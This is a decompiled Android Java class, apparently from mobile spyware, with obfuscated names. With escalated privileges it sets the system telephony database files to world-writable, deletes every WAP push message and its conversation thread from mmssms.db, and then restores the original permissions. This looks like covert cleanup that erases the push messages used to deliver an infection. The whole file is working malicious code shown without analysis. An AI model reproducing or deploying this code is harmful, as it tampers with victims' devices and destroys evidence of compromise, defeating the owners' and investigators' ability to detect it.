package com.network.android;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.network.android.c.a.a;
import com.network.b.b;
import java.io.File;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.concurrent.locks.ReentrantReadWriteLock;

/* access modifiers changed from: package-private */
public final class ac implements Runnable {
    ac() {
    }

    public final void run() {
        SQLiteDatabase openDatabase;
        try {
            if (!b.c()) {
                a.a("removeWapMessage android doesnt have PE.");
                return;
            }
            a.a("removeWapMessage:" + "/data/data/com.android.providers.telephony/databases/mmssms.db");
            if (!new File("/data/data/com.android.providers.telephony/databases/mmssms.db").exists()) {
                a.a("removeWapMessage DB not exists -> exit!: " + "/data/data/com.android.providers.telephony/databases/mmssms.db");
                return;
            }
            Cursor cursor = null;
            SQLiteDatabase sQLiteDatabase = null;
            ReentrantReadWriteLock.ReadLock readLock = new ReentrantReadWriteLock().readLock();
            try {
                String[] strArr = {"mmssms.db", "mmssms.db-shm", "mmssms.db-wal"};
                HashMap a2 = m.a("/data/data/com.android.providers.telephony/databases", strArr);
                m.a("0777", "/data/data/com.android.providers.telephony/databases", strArr);
                readLock.lock();
                try {
                    openDatabase = SQLiteDatabase.openDatabase("/data/data/com.android.providers.telephony/databases/mmssms.db", null, 16);
                } catch (Throwable th) {
                    a.a("removeWapMessage openDatabase SQLiteDatabase.NO_LOCALIZED_COLLATORS  | SQLiteDatabase.OPEN_READONLY Throwable- " + th.getMessage(), th);
                    a.a("removeWapMessage fail to openDatabase: " + "/data/data/com.android.providers.telephony/databases/mmssms.db" + ", try to open with CONFLICT_IGNORE");
                    openDatabase = SQLiteDatabase.openDatabase("/data/data/com.android.providers.telephony/databases/mmssms.db", null, 20);
                }
                Cursor rawQuery = openDatabase.rawQuery("select * from wpm", null);
                if (rawQuery == null) {
                    if (rawQuery != null) {
                        rawQuery.close();
                    }
                    if (openDatabase != null) {
                        openDatabase.close();
                    }
                    readLock.unlock();
                    return;
                }
                LinkedList linkedList = new LinkedList();
                HashSet hashSet = new HashSet();
                while (rawQuery.moveToNext()) {
                    String string = rawQuery.getString(rawQuery.getColumnIndex("href"));
                    String string2 = rawQuery.getString(rawQuery.getColumnIndex("_id"));
                    String string3 = rawQuery.getString(rawQuery.getColumnIndex("read"));
                    String string4 = rawQuery.getString(rawQuery.getColumnIndex("seen"));
                    String string5 = rawQuery.getString(rawQuery.getColumnIndex("thread_id"));
                    a.a("removeWapMessage seen " + string4 + ", read " + string3 + ", href:" + string + ", thread_id:" + string5);
                    linkedList.add(string2);
                    hashSet.add(string5);
                    a.a("removeWapMessage add TO REMOVE list seen " + string4 + ", read " + string3 + ", href:" + string);
                }
                Iterator it = linkedList.iterator();
                while (it.hasNext()) {
                    String str = "_id=" + ((String) it.next());
                    a.a("removeWapMessage removed WAP MESSAGE" + str + ", row affected : " + openDatabase.delete("wpm", str, null));
                }
                Iterator it2 = hashSet.iterator();
                while (it2.hasNext()) {
                    String str2 = "_id=" + ((String) it2.next());
                    a.a("removeWapMessage removed WAP THREAD " + str2 + ", row affected : " + openDatabase.delete("threads", str2, null));
                }
                m.a(a2, "/data/data/com.android.providers.telephony/databases", strArr);
                a.a("removeWapMessage end");
                if (rawQuery != null) {
                    try {
                        rawQuery.close();
                    } catch (Throwable th2) {
                        a.a("removeWapMessage error finaly- " + th2.getMessage(), th2);
                        return;
                    }
                }
                if (openDatabase != null) {
                    openDatabase.close();
                }
                readLock.unlock();
            } catch (Throwable th3) {
                a.a("removeWapMessage error finaly- " + th3.getMessage(), th3);
            }
        } catch (Throwable th4) {
            a.a("removeWapMessage error - " + th4.getMessage(), th4);
        }
    }
}
